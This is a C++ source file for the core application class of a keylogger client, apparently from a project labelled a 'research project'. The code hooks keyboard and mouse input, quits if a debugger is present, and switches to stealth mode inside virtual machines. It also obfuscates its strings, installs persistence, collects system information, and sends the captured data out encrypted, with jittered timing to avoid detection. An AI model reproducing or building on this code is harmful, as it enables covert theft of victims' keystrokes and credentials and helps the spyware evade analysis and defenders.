// KeyLoggerClient/src/core/Application.cpp
#include "core/Application.h"
#include "core/Configuration.h"
#include "core/Logger.h"
#include "hooks/KeyHook.h"
#include "hooks/MouseHook.h"
#include "security/AntiAnalysis.h"
#include "security/Obfuscation.h"
#include "persistence/PersistenceManager.h"
#include "communication/CommsManager.h"
#include "data/DataManager.h"
#include "utils/SystemUtils.h"
#include "utils/FileUtils.h"
#include "utils/TimeUtils.h"
#include <thread>
#include <chrono>
#include <string>

// Obfuscated strings
constexpr auto OBFUSCATED_APP_NAME = OBFUSCATE("KeyloggerResearchProject");
constexpr auto OBFUSCATED_MUTEX_NAME = OBFUSCATE("KLRP_MUTEX_7E3F1A");

Application::Application() : m_running(false), m_config(nullptr) {
    Initialize();
}

Application::~Application() {
    Shutdown();
}

bool Application::Initialize() {
    // Anti-analysis checks
    if (security::AntiAnalysis::IsDebuggerPresent()) {
        ExitProcess(0);
    }

    if (security::AntiAnalysis::IsRunningInVM()) {
        // Continue but use different tactics
        utils::SystemUtils::EnableStealthMode();
    }

    // Singleton instance check
    HANDLE hMutex = CreateMutexA(nullptr, TRUE, OBFUSCATED_MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        ExitProcess(0);
    }

    // Initialize components
    m_config = std::make_unique<Configuration>();
    if (!m_config->LoadConfiguration()) {
        return false;
    }

    Logger::Init(m_config->GetLogPath());
    LOG_INFO("Application initializing");

    m_dataManager = std::make_unique<DataManager>(m_config.get());
    m_commsManager = std::make_unique<CommsManager>(m_config.get());
    m_persistenceManager = std::make_unique<PersistenceManager>(m_config.get());

    // Install persistence mechanisms
    if (m_config->GetEnablePersistence()) {
        m_persistenceManager->Install();
    }

    // Initialize hooks
    m_keyHook = std::make_unique<KeyHook>(m_dataManager.get());
    m_mouseHook = std::make_unique<MouseHook>(m_dataManager.get());

    LOG_INFO("Application initialized successfully");
    return true;
}

void Application::Run() {
    m_running = true;
    LOG_INFO("Application starting main loop");

    std::string lastNetworkMode = "";
    
    while (m_running) {
        // Check for network mode changes
        std::string currentNetworkMode = m_config->GetNetworkMode();
        if (currentNetworkMode != lastNetworkMode) {
            LOG_INFO("Network mode changed, reinitializing communication");
            m_commsManager->Shutdown();
            m_commsManager->Initialize();
            lastNetworkMode = currentNetworkMode;
        }
        
        // Check for exit conditions
        if (utils::SystemUtils::IsExitTriggered()) {
            Shutdown();
            break;
        }

        // Process and transmit collected data
        if (m_dataManager->HasData()) {
            auto encryptedData = m_dataManager->RetrieveEncryptedData();
            if (m_commsManager->TransmitData(encryptedData)) {
                m_dataManager->ClearData();
            }
        }

        // Sleep with jitter to avoid pattern detection
        utils::TimeUtils::JitterSleep(
            m_config->GetCollectionInterval(),
            m_config->GetJitterFactor()
        );

        // Periodic system information collection
        if (m_config->GetCollectSystemInfo()) {
            auto systemInfo = utils::SystemUtils::CollectSystemInformation();
            m_dataManager->AddSystemData(systemInfo);
        }
    }
}

void Application::Shutdown() {
    if (!m_running) return;
    
    m_running = false;
    LOG_INFO("Application shutting down");

    // Remove hooks first
    m_keyHook.reset();
    m_mouseHook.reset();

    // Clean up persistence if configured
    if (m_config->GetRemovePersistenceOnExit()) {
        m_persistenceManager->Remove();
    }

    // Transmit any remaining data
    if (m_dataManager->HasData()) {
        auto encryptedData = m_dataManager->RetrieveEncryptedData();
        m_commsManager->TransmitData(encryptedData);
    }

    m_commsManager.reset();
    m_dataManager.reset();
    m_persistenceManager.reset();
    m_config.reset();

    Logger::Shutdown();
}